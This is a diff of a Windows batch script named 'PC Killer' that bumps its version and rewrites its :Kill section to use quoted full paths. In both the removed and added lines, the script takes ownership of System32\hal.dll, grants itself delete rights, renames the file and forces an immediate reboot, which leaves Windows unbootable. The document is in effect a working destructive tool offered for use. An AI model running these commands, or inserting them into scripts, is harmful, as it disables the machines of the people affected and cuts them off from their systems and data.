@@ -2,7 +2,7 @@
 title PC Killer
 setlocal
 echo Program Name: PC Killer
-echo Version: 1.1.0
+echo Version: 1.1.1
 echo Developer: @YonatanReuvenIsraeli
 echo Website: https://www.yonatanreuvenisraeli.dev
 echo License: GNU General Public License v3.0
@@ -39,10 +39,9 @@ echo Invalid Syntax!
 goto Warning
 
 :Kill
-cd /d %SystemRoot%\System32
-takeown /f hal.dll 
-icacls hal.dll /grant %USERNAME%:(d,wdac)
-ren hal.dll hal1.dll
+takeown /f "%SystemRoot%\System32\hal.dll"
+icacls "%SystemRoot%\System32\hal.dll" /grant %USERNAME%:(d,wdac)
+ren "%SystemRoot%\System32\hal.dll" "hal1.dll"
 endlocal
 Shutdown /r /t 00
 exit
